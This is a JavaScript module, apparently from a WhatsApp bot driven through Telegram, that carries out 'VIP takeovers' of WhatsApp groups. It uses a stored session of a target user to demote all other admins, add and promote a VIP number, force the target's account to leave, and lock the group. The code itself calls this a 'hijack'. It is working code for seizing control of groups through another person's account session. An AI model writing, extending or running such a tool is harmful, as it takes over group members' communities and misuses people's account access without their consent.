import { createComponentLogger } from '../../utils/logger.js'
import { VIPQueries } from '../../database/query.js'
import VIPHelper from './vip-helper.js'

const logger = createComponentLogger('VIP_TAKEOVER')
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms))

export class VIPTakeover {
  /**
   * Perform group takeover
   */
  static async takeover(vipTelegramId, targetTelegramId, groupJid, vipPhone) {
    console.log('[VIPTakeover] ===== STARTING TAKEOVER =====')
    console.log('[VIPTakeover] VIP:', vipTelegramId)
    console.log('[VIPTakeover] Target:', targetTelegramId)
    console.log('[VIPTakeover] Group:', groupJid)
    console.log('[VIPTakeover] VIP Phone:', vipPhone)

    const results = {
      success: false,
      steps: {
        validation: false,
        checkedPermissions: false,
        addedVIP: false,
        promotedVIP: false,
        demotedAdmins: false,
        removedUser: false,
        lockedGroup: false
      },
      errors: []
    }

    let targetSock = null
    let vipJid = null

    try {
      // Step 1: Validation
      console.log('[VIPTakeover] Step 1: Starting validation...')
      logger.info(`[Takeover] Starting takeover - VIP: ${vipTelegramId}, Target: ${targetTelegramId}, Group: ${groupJid}`)
      
      const canControl = await VIPHelper.canControl(vipTelegramId, targetTelegramId)
      console.log('[VIPTakeover] Can control result:', canControl)
      
      if (!canControl.allowed) {
        console.log('[VIPTakeover] Permission denied:', canControl.reason)
        results.errors.push(`Permission denied: ${canControl.reason}`)
        return results
      }
      
      targetSock = await VIPHelper.getUserSocket(targetTelegramId)
      console.log('[VIPTakeover] Target socket available:', !!targetSock)
      
      if (!targetSock) {
        console.log('[VIPTakeover] Target socket not available')
        results.errors.push('Target user socket not available')
        return results
      }
      
      vipJid = `${vipPhone}@s.whatsapp.net`
      console.log('[VIPTakeover] VIP JID:', vipJid)
      results.steps.validation = true
      console.log('[VIPTakeover] ✓ Step 1 complete: Validation')
      
      // Step 2: Get group metadata and check target user permissions
      console.log('[VIPTakeover] Step 2: Getting group metadata...')
      let groupMetadata
      try {
        groupMetadata = await targetSock.groupMetadata(groupJid)
        console.log('[VIPTakeover] Group metadata received:', groupMetadata.subject)
        console.log('[VIPTakeover] Total participants:', groupMetadata.participants.length)
      } catch (metadataError) {
        console.error('[VIPTakeover] Failed to get group metadata:', metadataError)
        logger.error(`[Takeover] Failed to get group metadata:`, metadataError)
        results.errors.push('Could not access group metadata. Target may not be in group.')
        return results
      }

      const targetUserJid = targetSock.user.id
      console.log('[VIPTakeover] Target user JID:', targetUserJid)
      
      // Extract target phone number (handle :5 device suffix)
      const targetPhoneNumber = targetUserJid.split('@')[0].split(':')[0]
      console.log('[VIPTakeover] Target phone number:', targetPhoneNumber)
      
      // Find target user in participants BY PHONE NUMBER
      console.log('[VIPTakeover] Searching for target user in participants...')
      let targetParticipant = null
      let targetParticipantJid = null
      
      for (const p of groupMetadata.participants) {
        try {
          const participantJid = p.id || p.jid
          
          // Extract phone from participant JID (handle :5 suffix and LIDs)
          let participantPhone
          if (participantJid.endsWith('@lid')) {
            const resolved = await VIPHelper.resolveJid(participantJid, targetSock, groupJid)
            participantPhone = resolved.split('@')[0].split(':')[0]
          } else {
            participantPhone = participantJid.split('@')[0].split(':')[0]
          }
          
          console.log('[VIPTakeover] Checking participant phone:', participantPhone)
          
          // Compare by phone number
          if (participantPhone === targetPhoneNumber) {
            targetParticipant = p
            targetParticipantJid = participantJid
            console.log('[VIPTakeover] ✓ Found target participant:', participantJid, 'Admin:', p.admin)
            break
          }
        } catch (participantError) {
          console.log('[VIPTakeover] Error checking participant:', participantError)
          continue
        }
      }
      
      if (!targetParticipant) {
        console.log('[VIPTakeover] Target user not found in group participants')
        console.log('[VIPTakeover] Searched for phone:', targetPhoneNumber)
        results.errors.push('Target user is not in the group')
        return results
      }
      
      const isOwner = targetParticipant.admin === 'superadmin'
      const isAdmin = targetParticipant.admin === 'admin' || targetParticipant.admin === 'superadmin'
      console.log('[VIPTakeover] Target is owner:', isOwner, '| Target is admin:', isAdmin)
      
      // Check if there's a group owner who is still admin (EXCLUDE TARGET BY PHONE)
      console.log('[VIPTakeover] Checking for active owner...')
      let hasActiveOwner = false
      
      for (const p of groupMetadata.participants) {
        try {
          if (p.admin === 'superadmin') {
            const participantJid = p.id || p.jid
            
            // Extract phone from participant
            let participantPhone
            if (participantJid.endsWith('@lid')) {
              const resolved = await VIPHelper.resolveJid(participantJid, targetSock, groupJid)
              participantPhone = resolved.split('@')[0].split(':')[0]
            } else {
              participantPhone = participantJid.split('@')[0].split(':')[0]
            }
            
            // Exclude target user by phone comparison
            if (participantPhone !== targetPhoneNumber) {
              hasActiveOwner = true
              console.log('[VIPTakeover] Found active owner:', participantJid)
              break
            }
          }
        } catch (participantError) {
          continue
        }
      }
      console.log('[VIPTakeover] Has active owner:', hasActiveOwner)
      
      // Determine if we can proceed
      const canHijack = isOwner || (isAdmin && !hasActiveOwner)
      console.log('[VIPTakeover] Can hijack:', canHijack)
      
      if (!canHijack) {
        if (!isAdmin) {
          console.log('[VIPTakeover] Target is not an admin')
          results.errors.push('Target user is not an admin or owner in this group')
        } else if (hasActiveOwner) {
          console.log('[VIPTakeover] Group has an active owner')
          results.errors.push('Group has an active owner. Can only hijack if target is owner or if no owner exists')
        }
        return results
      }
      
      results.steps.checkedPermissions = true
      console.log('[VIPTakeover] ✓ Step 2 complete: Permission check')
      logger.info(`[Takeover] Target user has sufficient permissions (Owner: ${isOwner}, Admin: ${isAdmin})`)
      
      // Step 3: Get all admins to demote (EXCLUDE TARGET BY PHONE)
      console.log('[VIPTakeover] Step 3: Collecting admins to demote...')
      const adminsToRemove = []
      
      for (const p of groupMetadata.participants) {
        try {
          if (p.admin === 'admin' || p.admin === 'superadmin') {
            const participantJid = p.id || p.jid
            
            // Extract phone from participant
            let participantPhone
            if (participantJid.endsWith('@lid')) {
              const resolved = await VIPHelper.resolveJid(participantJid, targetSock, groupJid)
              participantPhone = resolved.split('@')[0].split(':')[0]
            } else {
              participantPhone = participantJid.split('@')[0].split(':')[0]
            }
            
            // Exclude target user by phone comparison
            if (participantPhone !== targetPhoneNumber) {
              adminsToRemove.push(participantJid)
              console.log('[VIPTakeover] Will demote admin:', participantJid)
            }
          }
        } catch (adminError) {
          console.log('[VIPTakeover] Error collecting admin:', adminError)
          continue
        }
      }
      
      console.log('[VIPTakeover] Total admins to demote:', adminsToRemove.length)
      logger.info(`[Takeover] Found ${adminsToRemove.length} other admins to demote`)
      
      // Step 4: Demote all other admins FIRST (except target user)
      console.log('[VIPTakeover] Step 4: Demoting admins...')
      if (adminsToRemove.length > 0) {
        try {
          await targetSock.groupParticipantsUpdate(groupJid, adminsToRemove, 'demote')
          console.log('[VIPTakeover] Demote command sent successfully')
          await sleep(500)
          results.steps.demotedAdmins = true
          logger.info(`[Takeover] Demoted ${adminsToRemove.length} admins`)
          console.log('[VIPTakeover] ✓ Step 4 complete: Demoted admins')
        } catch (demoteError) {
          console.error('[VIPTakeover] Failed to demote admins:', demoteError)
          logger.error(`[Takeover] Failed to demote admins:`, demoteError)
          results.errors.push('Failed to demote some admins')
          results.steps.demotedAdmins = true
        }
      } else {
        results.steps.demotedAdmins = true
        console.log('[VIPTakeover] ✓ Step 4 complete: No admins to demote')
      }
      
      // Step 5: Check if VIP is in group
      console.log('[VIPTakeover] Step 5: Checking if VIP is in group...')
      const isVIPInGroup = await this.checkIfUserInGroup(targetSock, groupJid, vipPhone, groupMetadata)
      console.log('[VIPTakeover] VIP in group:', isVIPInGroup)
      logger.info(`[Takeover] VIP ${vipPhone} in group: ${isVIPInGroup}`)
      
      // Step 6: Add VIP to group if not already in
      console.log('[VIPTakeover] Step 6: Adding VIP to group...')
      let resolvedVipJid = vipJid
      
      if (!isVIPInGroup) {
        try {
          // Try to resolve VIP JID
          try {
            resolvedVipJid = await VIPHelper.resolveJid(vipJid, targetSock, groupJid)
            console.log('[VIPTakeover] Resolved VIP JID:', resolvedVipJid)
          } catch (vipResolveError) {
            console.log('[VIPTakeover] Could not resolve VIP JID, using original:', vipJid)
          }
          
          await targetSock.groupParticipantsUpdate(groupJid, [resolvedVipJid], 'add')
          console.log('[VIPTakeover] Add command sent successfully')
          await sleep(500)
          results.steps.addedVIP = true
          logger.info(`[Takeover] Added VIP to group`)
          console.log('[VIPTakeover] ✓ Step 6 complete: Added VIP')
        } catch (addError) {
          console.error('[VIPTakeover] Failed to add VIP:', addError)
          logger.error(`[Takeover] Failed to add VIP:`, addError)
          results.errors.push('Failed to add VIP to group')
          return results
        }
      } else {
        results.steps.addedVIP = true
        console.log('[VIPTakeover] ✓ Step 6 complete: VIP already in group')
      }
      
      // Step 7: Promote VIP to admin
      console.log('[VIPTakeover] Step 7: Promoting VIP to admin...')
      try {
        await targetSock.groupParticipantsUpdate(groupJid, [resolvedVipJid], 'promote')
        console.log('[VIPTakeover] Promote command sent successfully')
        await sleep(500)
        results.steps.promotedVIP = true
        logger.info(`[Takeover] Promoted VIP to admin`)
        console.log('[VIPTakeover] ✓ Step 7 complete: Promoted VIP')
      } catch (promoteError) {
        console.error('[VIPTakeover] Failed to promote VIP:', promoteError)
        logger.error(`[Takeover] Failed to promote VIP:`, promoteError)
        results.errors.push('Failed to promote VIP to admin')
        return results
      }
      
      // Step 8: Make target user leave the group
      console.log('[VIPTakeover] Step 8: Target user leaving group...')
      try {
        await targetSock.groupLeave(groupJid)
        console.log('[VIPTakeover] Leave command sent successfully')
        await sleep(500)
        results.steps.removedUser = true
        logger.info(`[Takeover] Target user left the group`)
        console.log('[VIPTakeover] ✓ Step 8 complete: Target left group')
      } catch (leaveError) {
        console.error('[VIPTakeover] Failed to leave group:', leaveError)
        logger.error(`[Takeover] Failed to leave group:`, leaveError)
        results.errors.push('Failed to remove target user from group')
      }
      
      // Step 9: Lock the group (restrict to admins only) - using VIP's session
      console.log('[VIPTakeover] Step 9: Locking group...')
      const vipSock = await VIPHelper.getVIPSocket(vipTelegramId)
      console.log('[VIPTakeover] VIP socket available:', !!vipSock)
      
      if (vipSock) {
        try {
          await vipSock.groupSettingUpdate(groupJid, 'announcement')
          console.log('[VIPTakeover] Lock command sent successfully')
          await sleep(1000)
          results.steps.lockedGroup = true
          logger.info(`[Takeover] Locked group to admins only`)
          console.log('[VIPTakeover] ✓ Step 9 complete: Locked group')
        } catch (lockError) {
          console.error('[VIPTakeover] Failed to lock group:', lockError)
          logger.error(`[Takeover] Failed to lock group:`, lockError)
          results.errors.push('Failed to lock group settings')
        }
      } else {
        console.log('[VIPTakeover] Could not get VIP socket')
        logger.warn(`[Takeover] Could not get VIP socket to lock group`)
        results.errors.push('Could not lock group - VIP socket unavailable')
      }
      
      // Log activity
      console.log('[VIPTakeover] Logging activity...')
      try {
        await VIPQueries.logActivity(
          vipTelegramId,
          'takeover',
          targetTelegramId,
          groupJid,
          {
            groupName: groupMetadata.subject,
            adminsRemoved: adminsToRemove.length,
            vipPhone,
            targetWasOwner: isOwner,
            targetWasAdmin: isAdmin
          }
        )
        console.log('[VIPTakeover] Activity logged successfully')
      } catch (logError) {
        console.error('[VIPTakeover] Failed to log activity:', logError)
        logger.error(`[Takeover] Failed to log activity:`, logError)
      }
      
      results.success = true
      console.log('[VIPTakeover] ===== TAKEOVER COMPLETED SUCCESSFULLY =====')
      logger.info(`[Takeover] Takeover completed successfully`)
      
    } catch (error) {
      console.error('[VIPTakeover] ===== CRITICAL ERROR =====')
      console.error('[VIPTakeover] Error type:', typeof error)
      console.error('[VIPTakeover] Error object:', error)
      console.error('[VIPTakeover] Error message:', error?.message)
      console.error('[VIPTakeover] Error stack:', error?.stack)
      
      // Enhanced error handling
      let errorMsg = 'Unknown error occurred'
      
      if (error && typeof error === 'object') {
        if (error.message) {
          errorMsg = error.message
        } else if (error.toString && error.toString() !== '[object Object]') {
          errorMsg = error.toString()
        } else {
          try {
            errorMsg = JSON.stringify(error)
          } catch {
            errorMsg = 'Error object could not be stringified'
          }
        }
      } else if (error) {
        errorMsg = String(error)
      }
      
      console.log('[VIPTakeover] Formatted error message:', errorMsg)
      logger.error(`[Takeover] Error during takeover:`, error)
      results.errors.push(errorMsg)
    }

    console.log('[VIPTakeover] Final results:', JSON.stringify(results, null, 2))
    return results
  }

  /**
   * Check if user is in group by phone number
   */
  static async checkIfUserInGroup(sock, groupJid, phone, metadata) {
    try {
      for (const participant of metadata.participants) {
        const participantJid = participant.id || participant.jid
        
        // Extract phone from participant (handle LIDs and :5 suffix)
        let participantPhone
        if (participantJid.endsWith('@lid')) {
          const resolved = await VIPHelper.resolveJid(participantJid, sock, groupJid)
          participantPhone = resolved.split('@')[0].split(':')[0]
        } else {
          participantPhone = participantJid.split('@')[0].split(':')[0]
        }
        
        if (participantPhone === phone) {
          return true
        }
      }
      return false
    } catch (error) {
      logger.error('Error checking if user in group:', error)
      return false
    }
  }

  /**
   * Takeover with group link
   */
  static async takeoverByLink(vipTelegramId, targetTelegramId, groupLink, vipPhone) {
    console.log('[VIPTakeover] takeoverByLink called')
    console.log('[VIPTakeover] Group link:', groupLink)
    
    try {
      // Extract invite code from link
      const inviteCode = groupLink.split('/').pop()
      console.log('[VIPTakeover] Invite code:', inviteCode)
      
      // Get target socket
      const targetSock = await VIPHelper.getUserSocket(targetTelegramId)
      if (!targetSock) {
        console.log('[VIPTakeover] Target socket not available')
        return { success: false, error: 'Target user socket not available' }
      }
      
      // Get group info from invite code
      console.log('[VIPTakeover] Getting group info from invite code...')
      const groupInfo = await targetSock.groupGetInviteInfo(inviteCode)
      const groupJid = groupInfo.id
      console.log('[VIPTakeover] Group JID from link:', groupJid)
      
      logger.info(`[Takeover] Taking over group via link: ${groupJid}`)
      
      // Perform takeover
      return await this.takeover(vipTelegramId, targetTelegramId, groupJid, vipPhone)
      
    } catch (error) {
      console.error('[VIPTakeover] Error in takeoverByLink:', error)
      logger.error('[Takeover] Error in takeover by link:', error)
      return { success: false, error: error?.message || error?.toString() || 'Unknown error' }
    }
  }
}

export default VIPTakeover